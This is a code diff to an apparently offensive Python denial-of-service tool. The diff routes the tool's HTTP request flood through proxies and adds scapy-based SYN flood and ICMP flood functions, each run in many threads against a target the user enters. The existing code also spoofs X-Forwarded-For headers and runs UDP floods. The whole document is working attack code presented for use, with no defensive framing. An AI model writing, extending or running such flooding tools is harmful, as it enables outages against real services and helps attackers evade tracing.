@@ -1,4 +1,3 @@
-
 import threading
 import requests
 import random
@@ -6,6 +5,7 @@ import string
 import time
 import os
 import socket
+from scapy.all import *
 
 # ANSI escape codes for colors
 class colors:
@@ -32,6 +32,11 @@ def send_http_request(url):
         'Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'
     ]
     
+    proxies = {
+        'http': 'http://your_proxy:port',
+        'https': 'https://your_proxy:port'
+    }
+    
     while True:
         try:
             params = {'q': genstr(random.randint(5, 15))}
@@ -40,7 +45,7 @@ def send_http_request(url):
                 'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),  # Simulate random IP
                 'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com'])  # Random referer
             }
-            response = session.get(url, params=params, headers=headers, timeout=10)  # Timeout set to 10 seconds
+            response = session.get(url, params=params, headers=headers, proxies=proxies, timeout=10)  # Timeout set to 10 seconds
             status_code = response.status_code
             if status_code == 200:
                 print(f"{colors.GREEN}Attack successful [{status_code}]{colors.END} Params: {params}")
@@ -61,6 +66,28 @@ def send_udp_flood(target_ip, target_port):
             print(f"{colors.RED}UDP Flood failed: {e}{colors.END}")
             time.sleep(random.randint(1, 3))  # Random backoff time between retries
 
+def send_syn_flood(target_ip, target_port):
+    while True:
+        try:
+            ip = IP(dst=target_ip)
+            tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
+            send(ip/tcp, verbose=False)
+            print(f"{colors.BLUE}SYN Flooding {target_ip}:{target_port}{colors.END}")
+        except Exception as e:
+            print(f"{colors.RED}SYN Flood failed: {e}{colors.END}")
+            time.sleep(random.randint(1, 3))  # Random backoff time between retries
+
+def send_icmp_flood(target_ip):
+    while True:
+        try:
+            ip = IP(dst=target_ip)
+            icmp = ICMP()
+            send(ip/icmp, verbose=False)
+            print(f"{colors.MAGENTA}ICMP Flooding {target_ip}{colors.END}")
+        except Exception as e:
+            print(f"{colors.RED}ICMP Flood failed: {e}{colors.END}")
+            time.sleep(random.randint(1, 3))  # Random backoff time between retries
+
 def main():
     os.system('clear')
     header = f"""
@@ -76,7 +103,7 @@ def main():
     print("Please enter your target URL or IP for the attack:")
     target = input("Target URL/IP: ").strip()
 
-    print("Enter the type of attack (http/udp):")
+    print("Enter the type of attack (http/udp/syn/icmp):")
     attack_type = input("Attack type: ").strip().lower()
 
     threads = []
@@ -91,6 +118,17 @@ def main():
         target_ip, target_port = target.split(':')
         for _ in range(thread_count):
             t = threading.Thread(target=send_udp_flood, args=(target_ip, int(target_port)))
+            t.start()
+            threads.append(t)
+    elif attack_type == "syn":
+        target_ip, target_port = target.split(':')
+        for _ in range(thread_count):
+            t = threading.Thread(target=send_syn_flood, args=(target_ip, int(target_port)))
+            t.start()
+            threads.append(t)
+    elif attack_type == "icmp":
+        for _ in range(thread_count):
+            t = threading.Thread(target=send_icmp_flood, args=(target,))
             t.start()
             threads.append(t)
     else:
